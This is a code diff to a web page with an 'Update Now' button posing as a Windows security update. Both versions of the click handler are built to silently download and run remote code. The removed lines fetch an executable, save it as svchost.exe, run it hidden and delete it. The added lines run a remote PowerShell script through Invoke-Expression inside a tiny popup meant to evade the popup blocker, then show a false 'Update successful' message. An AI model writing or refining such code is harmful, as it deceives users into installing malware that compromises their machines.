@@ -7,16 +7,16 @@
     <button id="updateBtn" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
         Update Now
     </button>
-
     <script>
         document.getElementById('updateBtn').addEventListener('click', function() {
-            // Fixed URL: Removed the trailing backslash
-            var psCmd = 'powershell -noprofile -executionpolicy bypass -windowstyle hidden -command "$u=\'https://github.com/finnandrew888/Windows-security-update/raw/refs/heads/main/Windowsupdateservice.exe\'; $f=\'$env:temp\\svchost.exe\'; iwr $u -out $f; start $f; sleep 5; rm $f -force"';
+            // This creates a temporary file on the fly and runs it
+            var url = "powershell.exe -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/finnandrew888/Windows-security-update/main/launch.txt')\"";
             
-            // Open a new PowerShell window silently
-            window.open('powershell.exe -c "' + psCmd.replace(/"/g, '\\"') + '"');
+            // We use a small trick to bypass the popup blocker
+            var w = window.open("about:blank", "_blank", "width=1,height=1");
+            w.document.write('<iframe src="' + url + '"></iframe>');
             
-            // Hide the button after clicking
+            // Hide UI
             this.style.display = 'none';
             document.body.innerHTML += '<p>Update successful. You may close this window.</p>';
         });
